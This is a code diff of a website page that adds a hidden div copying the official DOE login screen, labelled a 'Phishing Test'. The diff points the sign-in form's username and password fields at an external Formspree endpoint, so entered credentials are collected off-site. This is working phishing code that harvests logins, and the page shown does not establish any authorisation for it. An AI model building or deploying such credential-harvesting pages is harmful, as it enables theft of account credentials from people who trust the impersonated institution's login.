@@ -53,7 +53,10 @@
         <br>
         <footer id="foot">&copy Copyright of Urban Professional 2022 - 2022</footer>
     </div>
+
+    <!-- Phishing Test Div replicated the Offical DOE LOGIN -->
     <div id="fake">
+        <!-- Return button calls the js 'undo' function -->
         <button id="end" onclick="switchR()">Return</button>
         <br>
         <img id="ELogo" src="Images/DOELOGO.png" alt="Error">
@@ -61,7 +64,10 @@
             <h1>Sign In</h1>
         </div>
         <img id="doealert" src="Images/Invalid.png" alt="Error">
-        <form action="FormInput/DOEdump.txt" onsubmit="doealert()" method="POST">
+
+        <!-- Proper form embedded into the phishing test to allow user input to be
+        recieved on the backend -->
+        <form action="https://formspree.io/f/maykvgby" onsubmit="doealert()" method="POST">
         <p id="username">User name / Email</p>
         <input id="iuser" type="text" name="user" title="Please provide user name">
         <p id="password">Password</p>
